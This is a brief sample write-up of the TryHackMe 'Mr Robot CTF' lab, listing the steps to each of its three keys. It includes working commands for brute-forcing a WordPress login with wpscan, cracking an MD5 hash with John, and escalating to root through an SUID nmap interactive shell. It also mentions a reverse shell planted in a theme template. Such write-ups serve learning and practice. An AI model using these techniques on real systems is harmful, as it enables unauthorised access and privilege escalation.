---
title: "THM: Mr Robot CTF"
platform: THM
box: Mr Robot CTF
os: linux
difficulty: medium
date: 2026-07-30
tags: [wordpress, privesc, john, wpscan]
summary: "Three keys across a Mr Robot-themed box: robots.txt wordlist, a brute-forced WordPress login to a reverse shell, then an SUID nmap interactive shell to root."
sample: true
---

> SAMPLE WRITEUP, swap in your own notes.

## Key 1: robots.txt

```
/robots.txt
  fsocity.dic
  key-1-of-3.txt
```

`fsocity.dic` is a wordlist (with duplicates, `sort -u` it first).

## Key 2: WordPress

`wpscan` enumerates a valid username; the `fsocity.dic` list brute-forces the
password. A malicious theme template gives a reverse shell as `daemon`.

```bash
wpscan --url http://10.10.x.x --passwords fsocity.dic --usernames elliot
```

In `/home/robot` there's `key-2-of-3.txt` (unreadable) and a `password.raw-md5`.
Crack the MD5 with John, `su robot`, read key 2.

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Key 3: SUID nmap

```bash
find / -perm -4000 2>/dev/null
# /usr/local/bin/nmap  (SUID root, old version -> interactive mode)
nmap --interactive
!sh
# whoami -> root
cat /root/key-3-of-3.txt
```

## Takeaways

- Always `sort -u` a supplied wordlist before a long brute-force.
- Old SUID `nmap` (`--interactive`) is a classic GTFOBins root.
